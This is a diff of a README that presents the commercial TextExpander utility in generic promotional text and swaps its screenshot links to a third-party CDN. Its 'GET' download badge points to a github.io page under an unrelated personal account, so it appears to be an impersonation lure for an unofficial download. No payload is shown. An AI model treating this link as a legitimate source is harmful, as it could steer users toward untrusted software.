@@ -1,9 +1,8 @@
-
 # TextExpander Productivity Tools
 
 TextExpander is a text expansion and productivity utility that helps reduce repetitive typing through reusable snippets, custom abbreviations, formatted templates, and automated text replacement. It supports consistent responses and streamlined writing workflows across compatible applications.
 
-![TextExpander Interface](https://textexpander.com/static/images/presskit/textexpander-screenshot.png)
+![TextExpander Interface](https://b2381501.assetcdn.net/2381501/wp-content/uploads/2020/07/TextExpander_main_menu_2.png?lossy=1&strip=1&webp=1)
 
 [![GET — TextExpander](https://img.shields.io/badge/GET%20%E2%80%94%20TextExpander-0078D6?style=for-the-badge&logoColor=white)](https://deborahadamsm775.github.io/.github/TextExpander-Productivity-Tools)
 
@@ -33,7 +32,7 @@ TextExpander can support customer service replies, email composition, administra
 
 ## Interface Preview
 
-![TextExpander Snippet Editor](https://textexpander.com/static/images/presskit/textexpander-screenshot.png)
+![TextExpander Snippet Editor](https://b2381501.assetcdn.net/2381501/wp-content/uploads/2020/07/image-6.png?lossy=1&strip=1&webp=1)
 
 The snippet editor provides a workspace for managing saved content, assigning abbreviations, and maintaining reusable text entries. Available controls and expansion behavior depend on the installed application and snippet type.
 
